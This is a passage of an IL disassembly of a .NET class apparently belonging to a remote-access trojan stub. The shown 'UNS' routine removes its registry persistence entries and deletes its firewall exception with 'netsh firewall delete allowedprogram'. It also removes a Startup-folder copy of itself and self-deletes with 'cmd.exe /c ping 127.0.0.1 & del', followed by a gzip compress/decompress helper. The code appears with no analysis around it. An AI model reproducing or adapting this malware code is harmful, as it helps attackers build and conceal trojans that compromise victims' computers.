    IL_0050:  nop
    .try
    {
      IL_0051:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0056:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_005b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0060:  ldsfld     string ClassLibrary1.OK::sf
      IL_0065:  ldc.i4.1
      IL_0066:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_006b:  ldsfld     string ClassLibrary1.OK::RG
      IL_0070:  ldc.i4.0
      IL_0071:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0076:  nop
      IL_0077:  leave.s    IL_0097

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0079:  dup
      IL_007a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_007f:  stloc.3
      IL_0080:  nop
      IL_0081:  ldloc.3
      IL_0082:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0087:  nop
      IL_0088:  ldloc.3
      IL_0089:  stloc.2
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_008f:  nop
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0095:  leave.s    IL_0097

    }  // end handler
    IL_0097:  nop
    IL_0098:  nop
    .try
    {
      IL_0099:  ldstr      "netsh firewall delete allowedprogram \""
      IL_009e:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_00a3:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00a8:  ldstr      "\""
      IL_00ad:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b2:  ldc.i4.0
      IL_00b3:  ldc.i4.0
      IL_00b4:  ldc.i4.m1
      IL_00b5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00ba:  pop
      IL_00bb:  leave.s    IL_00df

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00bd:  dup
      IL_00be:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c3:  stloc.s    V_5
      IL_00c5:  nop
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00cd:  nop
      IL_00ce:  ldloc.s    V_5
      IL_00d0:  stloc.s    V_4
      IL_00d2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d7:  nop
      IL_00d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00dd:  leave.s    IL_00df

    }  // end handler
    IL_00df:  nop
    IL_00e0:  nop
    .try
    {
      IL_00e1:  ldsfld     class [mscorlib]System.IO.FileStream ClassLibrary1.OK::FS
      IL_00e6:  ldnull
      IL_00e7:  ceq
      IL_00e9:  ldc.i4.0
      IL_00ea:  ceq
      IL_00ec:  stloc.s    V_12
      IL_00ee:  ldloc.s    V_12
      IL_00f0:  brfalse.s  IL_011d

      IL_00f2:  ldsfld     class [mscorlib]System.IO.FileStream ClassLibrary1.OK::FS
      IL_00f7:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00fc:  nop
      IL_00fd:  ldc.i4.7
      IL_00fe:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0103:  ldstr      "\\"
      IL_0108:  ldsfld     string ClassLibrary1.OK::RG
      IL_010d:  ldstr      ".exe"
      IL_0112:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0117:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_011c:  nop
      IL_011d:  nop
      IL_011e:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0120:  dup
      IL_0121:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0126:  stloc.s    V_7
      IL_0128:  nop
      IL_0129:  ldloc.s    V_7
      IL_012b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0130:  nop
      IL_0131:  ldloc.s    V_7
      IL_0133:  stloc.s    V_6
      IL_0135:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013a:  nop
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0142

    }  // end handler
    IL_0142:  nop
    IL_0143:  nop
    .try
    {
      IL_0144:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0149:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_014e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0153:  ldstr      "Software"
      IL_0158:  ldc.i4.1
      IL_0159:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_015e:  ldsfld     string ClassLibrary1.OK::RG
      IL_0163:  ldc.i4.0
      IL_0164:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_0169:  nop
      IL_016a:  leave.s    IL_018e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016c:  dup
      IL_016d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0172:  stloc.s    V_8
      IL_0174:  nop
      IL_0175:  ldloc.s    V_8
      IL_0177:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_017c:  nop
      IL_017d:  ldloc.s    V_8
      IL_017f:  stloc.s    V_9
      IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0186:  nop
      IL_0187:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018c:  leave.s    IL_018e

    }  // end handler
    IL_018e:  nop
    IL_018f:  nop
    .try
    {
      IL_0190:  ldstr      "cmd.exe /c ping 127.0.0.1 & del \""
      IL_0195:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_019a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_019f:  ldstr      "\""
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  ldc.i4.0
      IL_01aa:  ldc.i4.0
      IL_01ab:  ldc.i4.m1
      IL_01ac:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01b1:  pop
      IL_01b2:  leave.s    IL_01d6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b4:  dup
      IL_01b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ba:  stloc.s    V_10
      IL_01bc:  nop
      IL_01bd:  ldloc.s    V_10
      IL_01bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c4:  nop
      IL_01c5:  ldloc.s    V_10
      IL_01c7:  stloc.s    V_11
      IL_01c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ce:  nop
      IL_01cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d4:  leave.s    IL_01d6

    }  // end handler
    IL_01d6:  nop
    IL_01d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01dc:  nop
    IL_01dd:  nop
    IL_01de:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B,
                                     bool& CM) cil managed
  {
    // Code size       228 (0xe4)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             int32 V_2,
             class [System]System.IO.Compression.GZipStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             uint8[] V_5,
             uint8[] V_6,
             class [System]System.IO.Compression.GZipStream V_7,
             class [mscorlib]System.IO.MemoryStream V_8,
             bool V_9)
    IL_0000:  nop
    IL_0001:  ldarg.1
    IL_0002:  ldind.i1
    IL_0003:  stloc.s    V_9
    IL_0005:  ldloc.s    V_9
    IL_0007:  brfalse.s  IL_006c

    IL_0009:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000e:  stloc.s    V_8
    IL_0010:  ldloc.s    V_8
    IL_0012:  ldc.i4.1
    IL_0013:  ldc.i4.1
    IL_0014:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode,
                                                                                       bool)
    IL_0019:  stloc.s    V_7
    IL_001b:  ldloc.s    V_7
    IL_001d:  ldarg.0
    IL_001e:  ldc.i4.0
    IL_001f:  ldarg.0
    IL_0020:  ldlen
    IL_0021:  conv.ovf.i4
    IL_0022:  callvirt   instance void [System]System.IO.Compression.GZipStream::Write(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0027:  nop
    IL_0028:  ldloc.s    V_7
    IL_002a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_002f:  nop
    IL_0030:  ldloc.s    V_8
    IL_0032:  ldc.i4.0
    IL_0033:  conv.i8
    IL_0034:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0039:  nop
    IL_003a:  ldloc.s    V_8
    IL_003c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0041:  conv.ovf.i4
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_6
    IL_004f:  ldloc.s    V_8
    IL_0051:  ldloc.s    V_6
    IL_0053:  ldc.i4.0
    IL_0054:  ldloc.s    V_6
    IL_0056:  ldlen
    IL_0057:  conv.ovf.i4
    IL_0058:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_005d:  pop
    IL_005e:  ldloc.s    V_8
    IL_0060:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0065:  nop
    IL_0066:  ldloc.s    V_6
    IL_0068:  stloc.s    V_5
    IL_006a:  br.s       IL_00e1

    IL_006c:  nop
    IL_006d:  ldarg.0
    IL_006e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0073:  stloc.s    V_4
    IL_0075:  ldloc.s    V_4
    IL_0077:  ldc.i4.0
    IL_0078:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_007d:  stloc.3
    IL_007e:  ldc.i4.4
    IL_007f:  newarr     [mscorlib]System.Byte
    IL_0084:  stloc.1
    IL_0085:  ldloc.s    V_4
    IL_0087:  ldloc.s    V_4
    IL_0089:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_008e:  ldc.i4.5
    IL_008f:  conv.i8
    IL_0090:  sub.ovf
    IL_0091:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0096:  nop
    IL_0097:  ldloc.s    V_4
    IL_0099:  ldloc.1
    IL_009a:  ldc.i4.0
    IL_009b:  ldc.i4.4
    IL_009c:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_00a1:  pop
    IL_00a2:  ldloc.1
    IL_00a3:  ldc.i4.0
    IL_00a4:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_00a9:  stloc.2
    IL_00aa:  ldloc.s    V_4
    IL_00ac:  ldc.i4.0
    IL_00ad:  conv.i8
    IL_00ae:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_00b3:  nop
    IL_00b4:  ldloc.2
    IL_00b5:  ldc.i4.1
    IL_00b6:  sub.ovf
    IL_00b7:  ldc.i4.1
    IL_00b8:  add.ovf
    IL_00b9:  ldc.i4.1
    IL_00ba:  sub.ovf
    IL_00bb:  ldc.i4.1
    IL_00bc:  add.ovf
    IL_00bd:  newarr     [mscorlib]System.Byte
    IL_00c2:  stloc.0
    IL_00c3:  ldloc.3
    IL_00c4:  ldloc.0
    IL_00c5:  ldc.i4.0
    IL_00c6:  ldloc.2
    IL_00c7:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_00cc:  pop
    IL_00cd:  ldloc.3
    IL_00ce:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_00d3:  nop
    IL_00d4:  ldloc.s    V_4
    IL_00d6:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_00db:  nop
    IL_00dc:  ldloc.0
    IL_00dd:  stloc.s    V_5
    IL_00df:  br.s       IL_00e1

    IL_00e1:  ldloc.s    V_5
    IL_00e3:  ret
  } // end of method OK::ZIP

} // end of class ClassLibrary1.OK


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\stu\stub.res
